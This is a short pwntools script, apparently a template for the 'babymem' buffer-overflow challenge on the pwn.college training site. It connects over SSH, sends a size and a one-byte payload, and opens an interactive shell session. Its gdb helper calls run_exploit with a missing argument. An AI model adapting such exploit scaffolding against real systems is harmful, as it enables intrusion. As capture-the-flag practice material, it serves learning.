#!/usr/bin/env python

from pwn import *

get_flag = True
chall_name = 'babymem'

def run_with_gdb(p):
    gdb.attach(p,'''
    b *main''')
    run_exploit(p)

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)
    payload_size = '1'
    overflow = 'A' * 1
    print(p.recv(timeout=2).decode())
    p.sendline(payload_size)
    print(p.recv(timeout=2).decode())
    p.sendline(overflow)
    p.interactive()

if get_flag:
    ssh_connection = ssh(host='ssh.college',user='hacker')
    process_full_path = '/challenge/' + chall_name
    p = ssh_connection.run(process_full_path)
    run_exploit(p, False)
    ssh_connection.close()
else:
    p = process('./' + chall_name)
    run_exploit(p, False)
